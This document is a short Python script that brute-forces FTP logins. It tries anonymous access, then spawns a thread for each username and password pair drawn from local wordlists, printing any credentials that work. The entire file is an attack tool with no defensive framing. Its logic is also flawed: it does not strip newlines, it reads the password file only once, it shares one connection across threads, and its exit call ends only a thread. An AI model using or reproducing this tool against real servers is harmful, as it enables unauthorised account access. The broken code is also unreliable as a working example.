

import ftplib
import sys
import threading

def anonLogin(ftp):
    try:
        ftp.login()  
        return True 
    except ftplib.Error as err:
        return False

def tryLogin(ftp,u,p):
    try:
        ftp.login(user = u, passwd = p)
        print(f"Success. {u}:{p}\n")
        ftp.quit()
        exit(0)
    except Exception as err:
        pass


anonLoginSuccess = False
ftp = None
if(len(sys.argv)==1):
    ftp = ftplib.FTP("127.0.0.1")
else:
    ftp = ftplib.FTP(sys.argv[1])    
    
anonLoginSuccess = anonLogin(ftp)

if(anonLoginSuccess):
    print("Anonymous Login: Success")
else:
    print("Anonymous Login: Failure")  

users = open("./usernames.txt","r")
pwds = open("./words.txt")

for u in users:
    for p in pwds:
        t = threading.Thread(target=tryLogin,args=[ftp,u,p])
        t.start()

print("Password List exhausted. Exiting.")
ftp.quit()
